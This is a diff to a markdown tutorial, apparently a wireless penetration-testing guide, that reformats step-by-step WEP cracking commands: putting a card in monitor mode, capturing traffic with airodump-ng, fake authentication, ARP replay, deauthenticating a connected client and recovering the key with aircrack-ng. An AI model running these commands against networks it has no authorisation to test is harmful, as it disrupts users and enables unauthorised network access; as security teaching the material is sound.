@@ -24,15 +24,15 @@
 1. Cracking WEP:
 ```
    a.	Connect the Alfa card to the kali linux vm. Check the interface name using the below command:
-        `iwconfig`
+        #iwconfig
    b.	Set the wireless interface to Monitor mode with the following commands:
-       `ifconfig wlan0 down
-      	iwconfig wlan0 mode monitor
-        ifconfig wlan0 up`
+       # ifconfig wlan0 down
+       # iwconfig wlan0 mode monitor
+       # ifconfig wlan0 up`
    c.	Confirm the wireless interface is in monitor mode by running the following command:
-       `iwconfig wlan0`
+       # iwconfig wlan0`
    d.	Run the airodump-ng sniffer to gain the details of the access points in the range.
-       `airodump-ng wlan0`
+       # airodump-ng wlan0
    e.	The output shows the details of the Access Points (AP) which are in range.
    f.	Note the following details of the AP which you want to crack the password:
       -	AP’s Mac Address (BSSID)
@@ -41,16 +41,16 @@
       -	Privacy (WEP/WPA2), Ciphers(TKIP/CCMP/MGT)
       -	Clients Mac Address (Station Mac)
    g.	Now, start the airodump with filters to capture only the desired AP’s traffic.
-      `airodump-ng wlan0 –essid <Name> --bssid <AP Mac> -c  <Channel number> -w <Filename to save capture>`
+      # airodump-ng wlan0 –essid <Name> --bssid <AP Mac> -c  <Channel number> -w <Filename to save capture>
    h.	Initialize a fake authentication with the AP with the following command:
-      `aireplay-ng -1 0 –e <ESSID> --bssid <AP Mac> -h <Own mac/ Alfa card mac> wlan0`
-   i.	Open another terminal and start ARP replay attack to capture Data packets at a faster rate in    order crack the WEP passkey.
-      `aireplay-ng -3 –b <BSSID> -h <own mac/Alfa card mac> wlan0`
+      # aireplay-ng -1 0 –e <ESSID> --bssid <AP Mac> -h <Own mac/ Alfa card mac> wlan0`
+   i.	Open another terminal and start ARP replay attack to capture Data packets at a faster rate in   order crack the WEP passkey.
+      # aireplay-ng -3 –b <BSSID> -h <own mac/Alfa card mac> wlan0
    j.	Open one more terminal, and deauthenticate a connected client, so that when the user connects back, and performs an ARP , we can capture the ARP request for replay.
-      `aireplay-ng -0 1 –a <AP Mac> -c <Client Mac> wlan0`
+      # aireplay-ng -0 1 –a <AP Mac> -c <Client Mac> wlan0
    k.	As soon as the ARP request is captured, aireplay will start replaying the arp packet to capture  the data packets at a faster rate. Notice the terminal in which arp replay attack is started and the airodump-ng output for the data packets.
    l.	When 50000 data packets are captured, run the following command to crack the WEP Password.
-      `aircrack-ng <capture file name>`
+      # aircrack-ng <capture file name>
    m.	If the password is not cracked, collect more data packets and run the aircrack-ng command again to crack the password.
 ```
   - There are other methods as well for cracking WEP ex. Korek Chop Chop attack, Fragmentation attack etc.
